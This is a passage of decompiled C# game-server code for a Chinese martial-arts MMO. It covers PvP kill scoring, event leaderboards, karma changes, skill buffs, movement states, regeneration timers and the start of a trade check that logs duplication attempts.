											base.势力战杀人数++;
											int num2 = base.Player_Level - value10.Player_Level + 20;
											if (num2 < 10)
											{
												num2 = 10;
											}
											if (base.Player_Zx == 1)
											{
												World.势力战正分数 += num2;
											}
											else
											{
												World.势力战邪分数 += num2;
											}
											if (World.EventTop.TryGetValue(base.UserName, out var value2))
											{
												EventTopClass eventTopClass = value2;
												eventTopClass.杀人数++;
												eventTopClass = value2;
												eventTopClass.玩家杀人分数 += num2;
											}
											else
											{
												value2 = new EventTopClass
												{
													人物名 = base.UserName,
													等级 = base.Player_Level,
													职业 = base.Player_Job,
													势力 = base.Player_Zx,
													帮派 = base.帮派名字,
													杀人数 = 1,
													死亡数 = 0
												};
												World.EventTop.TryAdd(base.UserName, value2);
											}
											if (World.EventTop.TryGetValue(value10.UserName, out var value3))
											{
												EventTopClass eventTopClass2 = value3;
												eventTopClass2.死亡数++;
											}
											else
											{
												EventTopClass value4 = new EventTopClass
												{
													人物名 = value10.UserName,
													等级 = value10.Player_Level,
													职业 = value10.Player_Job,
													势力 = value10.Player_Zx,
													帮派 = value10.帮派名字,
													杀人数 = 0,
													死亡数 = 1
												};
												World.EventTop.TryAdd(value10.UserName, value4);
											}
											系统提示("当前势力战杀人数[" + base.势力战杀人数 + "]。");
											value10.系统提示("当前势力战死亡数[" + value10.势力战死亡数 + "]。");
										}
										else
										{
											系统提示("对方已超出势力战对战范围, 不能获得分数。");
										}
									}
									else
									{
										系统提示("你已超出势力战对战范围, 不能获得分数。");
									}
								}
								else
								{
									系统提示("杀死同IP玩家不能获得分数。");
								}
							}
						}
						else if (base.人物坐标_地图 == 8001)
						{
							base.武林杀人数++;
							if (value10.武林杀人数 >= 3)
							{
								World.GlobalNotification("武林提示", 10, "英勇武士：" + base.UserName + "在武林血战终结了：" + value10.UserName + ", 的" + value10.武林杀人数 + "连杀！");
							}
							else if (base.武林杀人数 == 1)
							{
								World.GlobalNotification("武林提示", 10, "英勇武士：" + base.UserName + "在武林血战击败了：" + value10.UserName + ", 完成单杀!");
							}
							else if (base.武林杀人数 == 2)
							{
								World.GlobalNotification("武林提示", 10, "英勇武士：" + base.UserName + "在武林血战击败了：" + value10.UserName + ", 完成双杀!");
							}
							else if (base.武林杀人数 == 3)
							{
								World.GlobalNotification("武林提示", 10, "英勇武士：" + base.UserName + "在武林血战击败了：" + value10.UserName + ", 完成三杀!");
							}
							else if (base.武林杀人数 == 4)
							{
								World.GlobalNotification("武林提示", 10, "英勇武士：" + base.UserName + "在武林血战击败了：" + value10.UserName + ", 完成四杀!");
							}
							else if (base.武林杀人数 == 5)
							{
								World.GlobalNotification("武林提示", 10, "英勇武士：" + base.UserName + "在武林血战击败了：" + value10.UserName + ", 完成五杀!");
							}
							else if (base.武林杀人数 == 6)
							{
								World.GlobalNotification("武林提示", 10, "英勇武士：" + base.UserName + "在武林血战击败了：" + value10.UserName + ", 完成六杀!");
							}
							else if (base.武林杀人数 >= 7)
							{
								World.GlobalNotification("武林提示", 10, "英勇武士：" + base.UserName + "在武林血战击败了：" + value10.UserName + ", 完成超神!");
							}
						}
						else if (base.人物坐标_地图 == 2301 && World.Eve90进程 == 3)
						{
							if (检查玩家是否在对练区内(this))
							{
								if (value10.检查玩家是否在对练区内(value10))
								{
									PVP分数++;
								}
								else
								{
									value10.系统提示("超出对战范围, 不能获得分数。");
								}
							}
							else
							{
								系统提示("超出对战范围, 不能获得分数。");
							}
						}
						else if (base.人物坐标_地图 == 7301 && World.新门战进程 == 2)
						{
							if (检查玩家是否在帮战区内(this) && 检查玩家是否在帮战区内(value10))
							{
								foreach (帮战Class value6 in World.帮战list.Values)
								{
									if (value6.申请帮派ID == base.帮派Id)
									{
										value6.当前分数++;
										World.GlobalNotification("门战提示", 10, "「" + base.UserName + "」杀击了：≮" + value10.UserName + "≯荣誉积分 + 1，当前门派积分：『" + value6.当前分数 + "』");
									}
								}
							}
							else
							{
								value10.系统提示("超出对战范围, 不能获得分数。");
							}
						}
						else
						{
							if (value10.人物善恶 < 0)
							{
								value10.人物善恶 += 250;
								if (base.人物善恶 < 0 || base.Player_Zx != value10.Player_Zx || base.帮派名字 != value10.帮派名字)
								{
									base.人物善恶 += 100;
								}
							}
							else if (base.人物善恶 < 0)
							{
								if (base.Player_Zx != value10.Player_Zx || base.帮派名字 != value10.帮派名字)
								{
									base.人物善恶 += 100;
								}
								else
								{
									base.人物善恶 -= 500;
								}
							}
							else if (base.Player_Zx == value10.Player_Zx || base.帮派名字 == value10.帮派名字)
							{
								base.人物善恶 -= 500;
							}
							else
							{
								base.人物善恶 += 100;
							}
							string str = base.UserName + "在" + World.ServerID + "线" + 坐标Class.getname(base.人物坐标_地图) + "[" + (int)base.人物坐标_X + ", " + (int)base.人物坐标_Y + "]击杀：" + value10.UserName + "不服来战！";
							World.conn.发送("PK提示|" + 3 + "|" + str);
							if (World.是否开启武勋系统 == 1)
							{
								武勋系统(this, value10);
							}
							if (base.人物坐标_地图 == 2341 && World.比武泡点进程 == 1)
							{
								if (检查玩家是否在比武泡点区内(this))
								{
									if (value10.检查玩家是否在比武泡点区内(value10))
									{
										if (World.比武泡点Top.TryGetValue(base.UserName, out var value5))
										{
											value5.杀人数++;
											base.比武追加经验值 = (double)value5.杀人数 * 0.05;
											系统提示("你当前比武泡点分数为[" + value5.杀人数 + "],当前追加[" + base.比武追加经验值 + "]倍,请继续杀人.", 2, "系统提示");
										}
										else
										{
											value5 = new 比武泡点TopClass();
											value5.人物名 = base.UserName;
											value5.等级 = base.Player_Level;
											value5.势力 = base.Player_Zx;
											value5.帮派 = base.帮派名字;
											value5.职业 = base.Player_Job;
											value5.杀人数 = 1;
											系统提示("你当前比武泡点分数为[" + value5.杀人数 + "]请继续杀人。", 2, "系统提示");
											World.比武泡点Top.TryAdd(base.UserName, value5);
										}
									}
									else
									{
										value10.系统提示("超出比武泡点范围或没武勋,不能获得分数.");
									}
								}
								else
								{
									系统提示("超出比武泡点范围或没武勋,不能获得分数。");
								}
							}
							value10.更新武功和状态();
							更新武功和状态();
						}
					}
				}
				else if (攻击确认次数 == 0 && ((uint)(攻击模式 - 112) <= 1u || (uint)(攻击模式 - 126) <= 8u || 攻击模式 == 136))
				{
					物理攻击人物ID = 人物ID;
					if (自动攻击 != null)
					{
						自动攻击.Enabled = false;
						自动攻击.Close();
						自动攻击.Dispose();
						自动攻击 = null;
					}
					double interval = 500.0;
					if (GetAddState(801201))
					{
						interval = 300.0;
					}
					自动攻击 = new System.Timers.Timer(interval);
					自动攻击.Elapsed += 自动攻击事件;
					自动攻击.Enabled = true;
					自动攻击.AutoReset = true;
				}
				更新HP_MP_SP();
				value10.更新HP_MP_SP();
				goto IL_245d;
				IL_245d:
				触发神女传染 = false;
				goto end_IL_0001;
				IL_2467:
				更新HP_MP_SP();
				goto IL_245d;
				end_IL_0001:;
			}
			catch (Exception ex3)
			{
				攻击列表.Clear();
				怪物攻击列表.Clear();
				报错次数阀值++;
				if (World.是否开启票红字 == 1)
				{
					系统提示("你攻击确认出错, 请联系客服处理");
					MainForm.WriteLine(1, "攻击确认[" + base.Userid + "]-[" + base.UserName + "]-[" + 报错次数阀值 + "]" + ex3.Message);
				}
			}
		}

		private void 自动攻击事件(object source, ElapsedEventArgs e)
		{
			if (物理攻击人物ID <= 0)
			{
				if (自动攻击 != null)
				{
					自动攻击.Enabled = false;
					自动攻击.Close();
					自动攻击.Dispose();
					自动攻击 = null;
				}
				return;
			}
			物理攻击(0, 物理攻击人物ID);
			if (自动攻击 != null)
			{
				自动攻击.Enabled = false;
				自动攻击.Close();
				自动攻击.Dispose();
				自动攻击 = null;
			}
		}

		public void 触发自动攻击()
		{
			foreach (NpcClass value in MapClass.GetnpcTemplate(base.人物坐标_地图).Values)
			{
				if ((value.FLD_PID != 16430 || value.FLD_PID != 16431 || value.FLD_PID != 16435) && value.IsNpc == 0 && value.FLD_AUTO == 1 && value.Level >= base.Player_Level - 20 && !value.NPC死亡 && !value.自动攻击.Enabled && 查找范围Npc(60, value))
				{
					value.吸怪清理(this);
					if (怪物攻击列表.Count < World.吸怪数量)
					{
						value.npc_Add(this);
						value.Play_Add(this);
						value.自动移动.Enabled = false;
						value.自动攻击.Enabled = true;
					}
				}
			}
		}

		public void 魔法不足提示()
		{
			if (!base.Player死亡)
			{
				byte[] array = Converter.hexStringToByte("AA55160000003D0008000E2C090002000000000000000000000055AA");
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
		}

		public void 计算绝命技加成(武功类 武功, NpcClass npcClass)
		{
			switch (base.Player_Job)
			{
			case 9:
				if (武功.FLD_INDEX == 32)
				{
					npcClass.绝命技死亡经验加成 = 2.0;
					npcClass.绝命技死亡金钱加成 = 1.2;
					npcClass.绝命技死亡历练加成 = 3.0;
					npcClass.绝命技死亡爆率加成 = 0.1;
				}
				else if (武功.FLD_INDEX == 35)
				{
					npcClass.绝命技死亡经验加成 = 1.4;
					npcClass.绝命技死亡金钱加成 = 1.2;
					npcClass.绝命技死亡历练加成 = 2.0;
					npcClass.绝命技死亡爆率加成 = 0.15;
				}
				else if (武功.FLD_INDEX == 39)
				{
					npcClass.绝命技死亡经验加成 = 1.2;
					npcClass.绝命技死亡金钱加成 = 1.2;
					npcClass.绝命技死亡历练加成 = 2.0;
					npcClass.绝命技死亡爆率加成 = 0.2;
				}
				break;
			case 13:
				if (武功.FLD_INDEX == 21)
				{
					npcClass.绝命技死亡经验加成 = 2.0;
					npcClass.绝命技死亡金钱加成 = 1.2;
					npcClass.绝命技死亡历练加成 = 3.0;
					npcClass.绝命技死亡爆率加成 = 0.1;
				}
				else if (武功.FLD_INDEX == 22)
				{
					npcClass.绝命技死亡经验加成 = 1.4;
					npcClass.绝命技死亡金钱加成 = 1.2;
					npcClass.绝命技死亡历练加成 = 2.0;
					npcClass.绝命技死亡爆率加成 = 0.15;
				}
				else if (武功.FLD_INDEX == 23)
				{
					npcClass.绝命技死亡经验加成 = 1.2;
					npcClass.绝命技死亡金钱加成 = 1.2;
					npcClass.绝命技死亡历练加成 = 2.0;
					npcClass.绝命技死亡爆率加成 = 0.2;
				}
				break;
			case 1:
			case 2:
			case 3:
			case 4:
			case 5:
			case 6:
			case 7:
			case 8:
			case 10:
			case 11:
			case 12:
				if (武功.FLD_INDEX == 29)
				{
					npcClass.绝命技死亡经验加成 = 2.0;
					npcClass.绝命技死亡金钱加成 = 1.2;
					npcClass.绝命技死亡历练加成 = 3.0;
					npcClass.绝命技死亡爆率加成 = 0.1;
				}
				else if (武功.FLD_INDEX == 30)
				{
					npcClass.绝命技死亡经验加成 = 1.4;
					npcClass.绝命技死亡金钱加成 = 1.2;
					npcClass.绝命技死亡历练加成 = 2.0;
					npcClass.绝命技死亡爆率加成 = 0.15;
				}
				else if (武功.FLD_INDEX == 31)
				{
					npcClass.绝命技死亡经验加成 = 1.2;
					npcClass.绝命技死亡金钱加成 = 1.2;
					npcClass.绝命技死亡历练加成 = 2.0;
					npcClass.绝命技死亡爆率加成 = 0.2;
				}
				break;
			}
			npcClass.是否绝命技死亡 = true;
		}

		public void 轻功(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				byte[] array = new byte[4];
				byte[] array2 = new byte[2];
				Buffer.BlockCopy(封包数据, 10, array, 0, 4);
				Buffer.BlockCopy(封包数据, 4, array2, 0, 2);
				BitConverter.ToInt16(array2, 0);
				int num = BitConverter.ToInt32(array, 0);
				if (异常状态 != null && 异常状态.ContainsKey(8))
				{
					发送激活技能数据(num, 11);
					return;
				}
				if (base.人物坐标_地图 == 9001 || base.人物坐标_地图 == 9101 || base.人物坐标_地图 == 9201)
				{
					发送激活技能数据(num, 11);
					return;
				}
				if (人物灵兽 != null && 人物灵兽.骑 == 1)
				{
					发送激活技能数据(num, 10);
					return;
				}
				if (World.TBL_KONGFU.TryGetValue(num, out var value))
				{
					if ((int)DateTime.Now.Subtract(技能释放间隔).TotalMilliseconds < value.FLD_CDTIME)
					{
						return;
					}
					if (base.人物_MP < value.FLD_MP)
					{
						魔法不足提示();
						return;
					}
					技能释放间隔 = DateTime.Now;
					if ((value.FLD_JOB != 0 && base.Player_Job != value.FLD_JOB) || (value.FLD_ZX != 0 && base.Player_Zx != value.FLD_ZX) || base.Player_Job_leve < value.FLD_JOBLEVEL || base.Player_Level < value.FLD_LEVEL || !武功类.GetsfeWg(this, value.FLD_PID))
					{
						return;
					}
					switch (value.FLD_PID)
					{
					case 401201:
						发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
						break;
					case 301201:
					{
						if (GetAddState(301201))
						{
							追加状态列表[301201].时间结束事件();
						}
						追加状态类 value19 = new 追加状态类(this, 300000, value.FLD_PID, 0);
						追加状态列表.Add(value.FLD_PID, value19);
						addFLD_追加百分比_攻击(0.1);
						base.FLD_追加百分比_HP上限 += 0.05;
						更新武功和状态();
						状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 300000);
						发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
						break;
					}
					case 201201:
					{
						if (GetAddState(201201))
						{
							追加状态列表[201201].时间结束事件();
						}
						追加状态类 value5 = new 追加状态类(this, 300000, value.FLD_PID, 0);
						追加状态列表.Add(value.FLD_PID, value5);
						addFLD_追加百分比_攻击(0.05);
						更新武功和状态();
						状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 300000);
						发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
						break;
					}
					case 401401:
					{
						if (GetAddState(401401))
						{
							追加状态列表[401401].时间结束事件();
						}
						追加状态类 value13 = new 追加状态类(this, 30000 + (int)base.弓_回流真气, value.FLD_PID, 0);
						追加状态列表.Add(value.FLD_PID, value13);
						base.FLD_追加百分比_命中 += 0.4;
						base.FLD_追加百分比_HP上限 += 0.02;
						更新武功和状态();
						状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 30000 + (int)base.弓_回流真气);
						发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
						break;
					}
					case 601101:
					{
						if (GetAddState(601102))
						{
							追加状态列表[601102].时间结束事件();
						}
						if (GetAddState(601101))
						{
							追加状态列表[601101].时间结束事件();
						}
						if (GetAddState(601103))
						{
							追加状态列表[601103].时间结束事件();
						}
						if (潜行模式 == 1)
						{
							潜行状态(0);
						}
						追加状态类 value17 = new 追加状态类(this, 300000, value.FLD_PID, 0);
						追加状态列表.Add(value.FLD_PID, value17);
						状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 300000);
						行走状态id = 2;
						行走状态(array, 2);
						更新移动速度();
						break;
					}
					case 601102:
						if (潜行模式 == 1)
						{
							潜行状态(0);
						}
						if (GetAddState(601101))
						{
							追加状态列表[601101].时间结束事件();
						}
						if (GetAddState(601103))
						{
							追加状态列表[601103].时间结束事件();
						}
						if (!GetAddState(601102))
						{
							追加状态类 value2 = new 追加状态类(this, 300000, value.FLD_PID, 0);
							追加状态列表.Add(value.FLD_PID, value2);
							状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 300000);
						}
						行走状态id = 3;
						行走状态(array, 3);
						更新移动速度();
						break;
					case 601103:
						if (潜行模式 == 1)
						{
							潜行状态(0);
						}
						if (GetAddState(601101))
						{
							追加状态列表[601101].时间结束事件();
						}
						if (GetAddState(601102))
						{
							追加状态列表[601102].时间结束事件();
						}
						if (!GetAddState(601103))
						{
							追加状态类 value14 = new 追加状态类(this, 300000, value.FLD_PID, 0);
							追加状态列表.Add(value.FLD_PID, value14);
							状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 300000);
						}
						行走状态id = 5;
						行走状态(array, 5);
						更新移动速度();
						break;
					case 430102:
					case 430202:
					case 430302:
					case 430402:
					case 430502:
					case 436102:
					case 440102:
					case 440202:
					case 440302:
					case 440402:
					case 440502:
					case 446102:
					{
						long get物品ID = 装备栏已穿装备[12].Get物品ID;
						int num6 = ((装备栏已穿装备[3].Get物品ID == 0L || get物品ID == 0L) ? 6 : ((get物品ID == 0L || get物品ID != 0L) ? 1 : 7));
						if (base.当前激活技能ID == value.FLD_PID)
						{
							base.当前激活技能ID = 0;
						}
						else
						{
							base.当前激活技能ID = value.FLD_PID;
						}
						发送激活技能数据(value.FLD_PID, num6);
						if (num6 != 1)
						{
							base.当前激活技能ID = 0;
						}
						break;
					}
					case 801301:
						if ((int)DateTime.Now.Subtract(Pktime801301).TotalSeconds < 30)
						{
							return;
						}
						Pktime801301 = DateTime.Now;
						发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
						break;
					case 801202:
						if ((int)DateTime.Now.Subtract(Pktime801202).TotalSeconds < 240)
						{
							return;
						}
						Pktime801202 = DateTime.Now;
						if (GetAddState(601103))
						{
							追加状态列表[601103].时间结束事件();
						}
						if (GetAddState(601102))
						{
							追加状态列表[601102].时间结束事件();
						}
						if (GetAddState(601101))
						{
							追加状态列表[601101].时间结束事件();
						}
						行走状态id = 1;
						if (潜行模式 == 0)
						{
							系统提示("背包没空位了。");
							潜行状态(1);
						}
						else
						{
							潜行状态(0);
						}
						状态效果(BitConverter.GetBytes(value.FLD_PID), 0, 0);
						行走状态(BitConverter.GetBytes(value.FLD_PID), 0);
						更新移动速度();
						break;
					case 801201:
					{
						if (GetAddState(value.FLD_PID))
						{
							return;
						}
						int num2 = 100000;
						if (base.刺_剑刃乱舞 > 0.0)
						{
							num2 += (int)base.刺_剑刃乱舞;
						}
						追加状态类 value9 = new 追加状态类(this, num2, value.FLD_PID, 0);
						追加状态列表.Add(value.FLD_PID, value9);
						base.FLD_攻击速度 = 150;
						更新武功和状态();
						状态效果(BitConverter.GetBytes(value.FLD_PID), 1, num2);
						行走状态(BitConverter.GetBytes(value.FLD_PID), 1);
						更新攻击速度();
						break;
					}
					case 801401:
					{
						if (GetAddState(value.FLD_PID))
						{
							追加状态列表[value.FLD_PID].时间结束事件();
						}
						追加状态类 value3 = new 追加状态类(this, 30000, value.FLD_PID, 0);
						追加状态列表.Add(value.FLD_PID, value3);
						状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 30000);
						行走状态(BitConverter.GetBytes(value.FLD_PID), 1);
						发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
						break;
					}
					case 801302:
					{
						if (GetAddState(value.FLD_PID))
						{
							return;
						}
						追加状态类 value21 = new 追加状态类(this, 60000, value.FLD_PID, 0);
						追加状态列表.Add(value.FLD_PID, value21);
						状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 60000);
						行走状态(BitConverter.GetBytes(value.FLD_PID), 1);
						delFLD_追加百分比_防御(0.2);
						base.FLD_人物_追加百分比_回避 += 1.0;
						更新武功和状态();
						break;
					}
					case 901301:
					{
						if (GetAddState(901301))
						{
							新吃药提示();
							return;
						}
						if (GetAddState(901302))
						{
							追加状态列表[901302].时间结束事件();
						}
						if (GetAddState(901303))
						{
							追加状态列表[901303].时间结束事件();
						}
						int num5 = (int)base.琴师_高山流水 * 10000 + 60000;
						追加状态类 value16 = new 追加状态类(this, num5, value.FLD_PID, 0);
						追加状态列表.Add(value.FLD_PID, value16);
						状态效果(BitConverter.GetBytes(value.FLD_PID), 1, num5);
						发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
						更新武功和状态();
						base.上河调计数 = 0;
						break;
					}
					case 901302:
					{
						if (GetAddState(901302))
						{
							新吃药提示();
							return;
						}
						if (GetAddState(901301))
						{
							追加状态列表[901301].时间结束事件();
						}
						if (GetAddState(901303))
						{
							追加状态列表[901303].时间结束事件();
						}
						int num8 = (int)base.琴师_高山流水 * 10000 + 60000;
						追加状态类 value4 = new 追加状态类(this, num8, value.FLD_PID, 0);
						追加状态列表.Add(value.FLD_PID, value4);
						状态效果(BitConverter.GetBytes(value.FLD_PID), 1, num8);
						发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
						更新武功和状态();
						base.下河调计数 = 0;
						break;
					}
					case 901303:
					{
						if (base.琴师_高山流水 < 20.0)
						{
							return;
						}
						if (GetAddState(901303))
						{
							新吃药提示();
							return;
						}
						if (GetAddState(901301))
						{
							追加状态列表[901301].时间结束事件();
						}
						if (GetAddState(901302))
						{
							追加状态列表[901302].时间结束事件();
						}
						int num3 = (int)base.琴师_高山流水 * 10000 + 60000;
						追加状态类 value11 = new 追加状态类(this, num3, value.FLD_PID, 0);
						追加状态列表.Add(value.FLD_PID, value11);
						状态效果(BitConverter.GetBytes(value.FLD_PID), 1, num3);
						发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
						更新武功和状态();
						base.玉连环计数 = 0;
						break;
					}
					case 800103:
					case 810203:
					case 810303:
					case 810403:
					case 810503:
					case 810603:
					case 810703:
					case 820203:
					case 820303:
					case 820403:
					case 820503:
					case 820603:
					case 820703:
					case 830101:
					case 830201:
					case 830301:
					case 830401:
					case 830501:
					case 836101:
					case 840101:
					case 840201:
					case 840301:
					case 840401:
					case 840501:
					case 846101:
					{
						int num9 = ((装备栏已穿装备[3].Get物品ID != 0L) ? 1 : 6);
						if (base.当前激活技能ID == value.FLD_PID)
						{
							base.当前激活技能ID = 0;
						}
						else
						{
							base.当前激活技能ID = value.FLD_PID;
						}
						发送激活技能数据(value.FLD_PID, num9);
						if (num9 != 1)
						{
							base.当前激活技能ID = 0;
						}
						break;
					}
					case 1001101:
						if (GetAddState(1001102))
						{
							追加状态列表[1001102].时间结束事件();
						}
						if (!GetAddState(1001101))
						{
							追加状态类 value18 = new 追加状态类(this, 300000, value.FLD_PID, 0);
							追加状态列表.Add(value.FLD_PID, value18);
							状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 300000);
						}
						行走状态id = 6;
						行走状态(array, 6);
						更新移动速度();
						break;
					case 901401:
					{
						if (base.琴师_高山流水 < 20.0 || 武功新[1, 5] == null || 武功新[1, 6] == null || 武功新[1, 7] == null)
						{
							发送激活技能数据(num, 11);
							return;
						}
						int num10 = 0;
						if (GetAddState(900401))
						{
							num10 = 900401;
						}
						if (GetAddState(900402))
						{
							num10 = 900402;
						}
						if (GetAddState(900403))
						{
							num10 = 900403;
						}
						if (num10 == 0)
						{
							发送激活技能数据(num, 11);
							return;
						}
						追加状态列表[num10].时间结束事件();
						int num11 = (int)base.琴师_高山流水 * 10000 + 60000;
						追加状态类 value6 = new 追加状态类(this, num11, num10, 0);
						追加状态列表.Add(num10, value6);
						状态效果(BitConverter.GetBytes(num10), 1, num11);
						发送攻击人物数据(this, base.人物全服ID, num10, 1, 0, 0, 0, -1);
						更新武功和状态();
						break;
					}
					case 1001202:
					{
						if (GetAddState(1001201) || GetAddState(1001202))
						{
							return;
						}
						追加状态类 value20 = new 追加状态类(this, 3000, value.FLD_PID, 0);
						追加状态列表.Add(value.FLD_PID, value20);
						状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 3000);
						行走状态id = 9;
						行走状态(array, 9);
						更新移动速度();
						break;
					}
					case 1001201:
					{
						if (GetAddState(1001201) || GetAddState(1001202))
						{
							return;
						}
						追加状态类 value10 = new 追加状态类(this, 3000, value.FLD_PID, 0);
						追加状态列表.Add(value.FLD_PID, value10);
						状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 3000);
						行走状态id = 8;
						行走状态(array, 8);
						更新移动速度();
						break;
					}
					case 1001102:
						if (GetAddState(1001101))
						{
							追加状态列表[1001101].时间结束事件();
						}
						if (!GetAddState(1001102))
						{
							追加状态类 value8 = new 追加状态类(this, 300000, value.FLD_PID, 0);
							追加状态列表.Add(value.FLD_PID, value8);
							状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 300000);
						}
						行走状态id = 7;
						行走状态(array, 7);
						更新移动速度();
						break;
					case 1001401:
						if (base.人物坐标_地图 == 28401)
						{
							if ((double)lastX == 0.0 && (double)lastY == 0.0 && lastMAP == 101)
							{
								移动(500f, 1575f, 15f, 101);
							}
							else
							{
								移动(lastX, lastY, 15f, lastMAP);
							}
						}
						else
						{
							lastX = base.人物坐标_X;
							lastY = base.人物坐标_Y;
							lastMAP = base.人物坐标_地图;
							移动(0f, 0f, 15f, 28401);
						}
						break;
					case 1001301:
					{
						if (GetAddState(1001301))
						{
							追加状态列表[1001301].时间结束事件();
							return;
						}
						if (base.人物PK模式 != 0 || GetAddState(1001302) || GetAddState(1001303))
						{
							return;
						}
						int num4 = 10000 + (int)base.韩_火龙问鼎;
						追加状态类 value15 = new 追加状态类(this, num4, value.FLD_PID, 0);
						追加状态列表.Add(value.FLD_PID, value15);
						状态效果(BitConverter.GetBytes(value.FLD_PID), 1, num4);
						发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
						base.FLD_人物_武功攻击力增加百分比 += 0.05;
						更新武功和状态();
						break;
					}
					case 1001302:
					{
						if (GetAddState(1001302))
						{
							追加状态列表[1001302].时间结束事件();
							return;
						}
						if (base.人物PK模式 != 0 || GetAddState(1001301) || GetAddState(1001303))
						{
							return;
						}
						int num12 = 10000 + (int)base.韩_火龙问鼎;
						追加状态类 value7 = new 追加状态类(this, num12, value.FLD_PID, 0);
						追加状态列表.Add(value.FLD_PID, value7);
						状态效果(BitConverter.GetBytes(value.FLD_PID), 1, num12);
						发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
						base.FLD_人物_武功攻击力增加百分比 += 0.1;
						更新武功和状态();
						break;
					}
					case 1001303:
					{
						if (GetAddState(1001303))
						{
							追加状态列表[1001303].时间结束事件();
							return;
						}
						if (GetAddState(1001301) || GetAddState(1001302))
						{
							return;
						}
						int num7 = 10000 + (int)base.韩_火龙问鼎;
						追加状态类 value22 = new 追加状态类(this, num7, value.FLD_PID, 0);
						追加状态列表.Add(value.FLD_PID, value22);
						状态效果(BitConverter.GetBytes(value.FLD_PID), 1, num7);
						发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
						base.FLD_人物_武功攻击力增加百分比 += 0.15;
						更新武功和状态();
						break;
					}
					case 4001401:
						if (base.人物坐标_地图 == 51201)
						{
							if ((double)lastX == 0.0 && (double)lastY == 0.0 && lastMAP == 101)
							{
								移动(500f, 1575f, 15f, 101);
							}
							else
							{
								移动(lastX, lastY, 15f, lastMAP);
							}
						}
						else
						{
							lastX = base.人物坐标_X;
							lastY = base.人物坐标_Y;
							lastMAP = base.人物坐标_地图;
							移动(0f, 0f, 15f, 51201);
						}
						break;
					case 2001301:
					{
						if (GetAddState(2001301))
						{
							追加状态列表[2001301].时间结束事件();
						}
						追加状态类 value12 = new 追加状态类(this, 300000, value.FLD_PID, 0);
						追加状态列表.Add(value.FLD_PID, value12);
						addFLD_追加百分比_攻击(0.03);
						更新武功和状态();
						状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 300000);
						发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
						break;
					}
					}
					base.人物_MP -= value.FLD_MP;
					更新HP_MP_SP();
					return;
				}
				if (自动恢复 != null)
				{
					自动恢复.Enabled = false;
					自动恢复.Close();
					自动恢复.Dispose();
					自动恢复 = null;
				}
				if (BitConverter.ToInt32(array, 0) == 1)
				{
					发送打坐数据();
					if (自动恢复 != null)
					{
						自动恢复.Enabled = false;
						自动恢复.Close();
						自动恢复.Dispose();
						自动恢复 = null;
					}
					自动恢复 = new System.Timers.Timer(3000.0);
					自动恢复.Elapsed += 内功恢复;
					自动恢复.Enabled = true;
					自动恢复.AutoReset = true;
				}
				行走状态id = 1;
				行走状态id1 = 0;
				行走状态(array, 1);
				更新移动速度();
			}
			catch
			{
			}
		}

		public void 内功恢复(object source, ElapsedEventArgs e)
		{
			if (base.人物_HP <= 0)
			{
				base.人物_HP = 0;
				return;
			}
			if (base.人物_HP >= base.人物最大_HP && base.人物_MP >= base.人物最大_MP)
			{
				if (自动恢复 != null)
				{
					自动恢复.Enabled = false;
					自动恢复.Close();
					自动恢复.Dispose();
					自动恢复 = null;
				}
				return;
			}
			if (base.人物_HP + 160 < base.人物最大_HP)
			{
				base.人物_HP += 160;
			}
			else
			{
				base.人物_HP = base.人物最大_HP;
			}
			if (base.人物_MP + 102 < base.人物最大_MP)
			{
				base.人物_MP += 102;
			}
			else
			{
				base.人物_MP = base.人物最大_MP;
			}
			更新HP_MP_SP();
		}

		public void 障力恢复(object source, ElapsedEventArgs e)
		{
			if (base.人物_HP <= 0)
			{
				base.人物_HP = 0;
				return;
			}
			if (base.人物_AP >= base.人物最大_AP)
			{
				base.人物_AP = base.人物最大_AP;
				return;
			}
			int num = (int)base.梅_障力运用 + base.FLD_装备_追加_障力恢复量;
			if (num > 0)
			{
				if (base.人物_AP + num < base.人物最大_AP)
				{
					base.人物_AP += num;
				}
				else
				{
					base.人物_AP = base.人物最大_AP;
				}
				更新HP_MP_SP();
			}
		}

		public void 交易成功(Players Playe)
		{
			try
			{
				if (Playe.退出中)
				{
					return;
				}
				if (Playe.交易.交易人.退出中)
				{
					MainForm.WriteLine(6, "退出复制BUG12 [" + Playe.交易.交易人.Userid + "][" + Playe.交易.交易人.UserName + "][" + Playe.交易.交易人.Client.ToString() + "] ");
					return;
				}
				if (Playe.个人商店 != null)
				{
					MainForm.WriteLine(6, "非法复制_交易[" + Playe.Userid + "]-[" + Playe.UserName + "]开店交易");
					return;
				}
				if (Playe.交易.交易人.个人商店 != null)
				{
					MainForm.WriteLine(6, "非法复制_交易[" + Playe.交易.交易人.Userid + "]-[" + Playe.交易.交易人.UserName + "]开店交易");
					return;
				}
